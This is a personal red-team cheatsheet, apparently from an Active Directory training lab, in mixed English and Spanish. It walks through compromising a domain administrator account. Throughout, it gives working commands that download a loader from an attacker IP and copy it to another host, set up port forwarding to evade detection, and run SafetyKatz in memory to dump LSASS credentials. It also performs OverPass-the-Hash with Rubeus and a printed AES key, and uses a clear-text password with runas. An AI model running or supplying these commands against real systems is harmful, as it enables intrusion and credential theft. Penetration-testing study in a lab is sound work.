# 🏁 Cheatsheet - Fast Commands (EXPLOTATION)

## SafetyKatz in-memory

> We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa para dumpear LSASS) on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe =(programa que **descarga y ejecuta otro binario en memoria)** on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

> Remember upload <mark style="color:$warning;">SafetyKatz</mark> to the webshell
>
> Remember upload <mark style="color:$warning;">Loader.exe</mark> to the webshell

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt="" width="302"><figcaption></figcaption></figure>

> ```
> [ Attacker VM ] 172.16.100.113
>         |
>         |  hosting tools (PowerView, SafetyKatz, bypass scripts)
>         |  reverse shell listener (nc)
>         v
> [ Jenkins server → dcorp-ci ] (reverse shell from Jenkins job abuse)
> User obtained: ciadmin
>         |
>         |  AMSI + ScriptBlockLogging bypass
>         |  Load PowerView
>         |  Find-DomainUserLocation
>         v
>     Domain Admin session discovered
>     svcadmin → dcorp-mgmt
>         |
>         |  test remote execution -->
>         |  --> winrs / PowerShell Remoting
>         v
> [ dcorp-mgmt ]
> Access confirmed as: ciadmin
>         |
>         |  create port forwarding
>         |  netsh portproxy
>         v
>     dcorp-mgmt:8080 → attacker:80
>         |
>         |  download tools through mgmt server
>         |  execute credential dumping
>         v
>    SafetyKatz / Mimikatz
>         |
>         v
>    Dump LSASS
>         |
>         v
>    Steal credentials of svcadmin (Domain Admin)
> ```

Run the following command on the shell of rever shell (ciadmin\dcorp-ci):

```
iwr http://172.16.100.53/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
## if it give us error us its -->
##copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
##cmd /c copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Port Forwarding - Bypass Detections

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.53"
```

> Note: Please note that we have to use the $null variable to address output redirection issues.
>
> Remeber user the same port that your web server (:280)

### Excet in-memory using

> Extract LSASS

To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:

```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Sweet! We got credentials of svcadmin - a domain administrator.&#x20;

> Note that svcadmin is used as a service account (see “Session” in the above output), so you can even get credentials in clear-text from lsasecrets!

***

## OverPass-the-Hash

> Finally, use OverPass-the-Hash to use svcadmin’s credentials.

Run the commands below from an elevated shell on the student VM to use Rubeus.&#x20;

> Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.):

### Rubeus OPtH

> In us machine VM, run it how local admin privileges

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Into it new cmd try to access at the domain controller from the new process!

```
C:\Windows\system32> winrs -r:dcorp-dc cmd /c set username
USERNAME=svcadmin
```

> Note that we did not need to have direct access to `dcorp-mgmt` from the student VM.

***

## Use runas + netonly

We got credentials for the `srvadmin` user in clear-text!&#x20;

Start a cmd process using runas. Run the below command from an elevated shell:

```
runas /user:dcorp\srvadmin /netonly cmd
```

> Passwd: TheKeyUs3ron@anyMachine!

> With it we connect with the user and pass of srvadmin buuttt!! it give us a cmd with us user student and the same machine but with the red/priv of srvadmin user
>
> "/netonly" = ✔ no cambia tu sesión\
> &#x20;                    ✔ no necesitas logon interactivo\
> &#x20;                    ✔ no crea logon tipo 2\
> &#x20;                    ✔ es más OPSEC friendly

The new process that starts has srvadmin privileges.&#x20;

<mark style="background-color:yellow;">Check if srvadmin has admin privileges on any other machine.</mark>

Use invishell + seach remote admin access -->

> Remember user PowerView!

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see how we have local admin access on the `dcorp-mgmt` server as srvadmin and we already know a session of svcadmin is present on that machine.

Let’s use SafetyKatz to extract credentials from the machine.&#x20;

> Run the below commands from the process running as srvadmin terminal

Copy the Loader.exe to `dcorp-mgmt`:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now extract the credentials:

> Remember to have the Safetykatz.exe available in a web server to download it and exuecute in memorie at the same ttime with the command.
>
> Remember to have too the portforwarding do, but!! for this case, we can use directly us ip and webserver

```
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.113:80/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
